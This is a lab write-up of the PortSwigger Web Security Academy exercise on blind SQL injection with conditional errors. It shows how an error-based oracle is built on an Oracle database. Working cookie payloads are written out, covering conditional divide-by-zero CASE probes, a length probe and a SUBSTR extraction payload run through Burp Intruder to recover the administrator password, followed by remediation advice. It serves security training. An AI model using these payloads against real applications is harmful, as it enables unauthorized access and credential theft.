# Blind SQL injection with conditional errors

- **Platform:** PortSwigger Web Security Academy
- **Lab:** [Blind SQL injection with conditional errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)
- **Level:** Practitioner
- **Date solved:** 2026-11-13
- **Tools:** Burp Suite (Proxy, Repeater, Intruder)

## Goal
Retrieve the administrator's password and log in. The page shows no query output and
behaves the same for true and false conditions, so there is no content-based oracle.

## What it is
The `TrackingId` cookie is used in a SQL query (Oracle), but unlike the conditional-
responses lab there is no visible difference between a query that returns a row and one
that does not. To get an oracle I make the database throw an error conditionally: a true
condition triggers a divide-by-zero (HTTP 500), a false one does not (HTTP 200).

## What I noticed
Injection point is the cookie again. The database is Oracle, so the payload uses `||`
concatenation, `FROM dual`, `SUBSTR`, and `TO_CHAR(1/0)` to force the error.

## What I tried
- Confirmed the query reaches an Oracle database:
  - `' || (SELECT '' FROM dual) || '` -> 200 (valid)
  - `' || (SELECT '' FROM not_a_real_table) || '` -> error (invalid table)
- Built the oracle with a conditional divide-by-zero:
  - `' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '` -> **500**
  - `' || (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '` -> **200**
  - So 500 = true, 200 = false.
- Confirmed the admin and found the length:
  - CASE inside `SELECT ... FROM users WHERE username='administrator'` -> 500, admin exists.
  - `CASE WHEN LENGTH(password)>N ...` increased until it flipped to 200 -> length **20**.

## How I exploited it
- Extracted the password character by character with Oracle `SUBSTR`:

      ' || (SELECT CASE WHEN SUBSTR(password,<pos>,1)='<char>' THEN TO_CHAR(1/0) ELSE '' END
            FROM users WHERE username='administrator') || '

  A 500 for a given position/character means that character is correct.
- Ran it in Burp Intruder as a cluster bomb (position 1-20 x character a-z0-9), grepping
  / sorting on **status code 500** instead of a body string, to read off the 20
  characters. (Community Intruder is throttled, so this is slow.)
- Logged in as `administrator` with the recovered password. Lab solved.

## Impact
Even with no output and no visible true/false difference, the injection is fully
exploitable: I manufactured an oracle out of the error behaviour and read the whole admin
password. "No visible difference" is not a mitigation.

## How to fix it
1. Parameterized queries, so the cookie cannot change the SQL.
2. Salted password hashes (bcrypt / Argon2).
3. Generic error handling that does not leak a distinguishable error state to the client
   (though this only hides one oracle; the real fix is parameterization).

## Key takeaway
When the app gives no true/false signal, create one with a conditional error
(`CASE WHEN ... THEN 1/0`). The 500-vs-200 difference is the oracle; extraction is then
the same character-by-character process. Oracle syntax: `||`, `FROM dual`, `SUBSTR`,
`TO_CHAR(1/0)`.
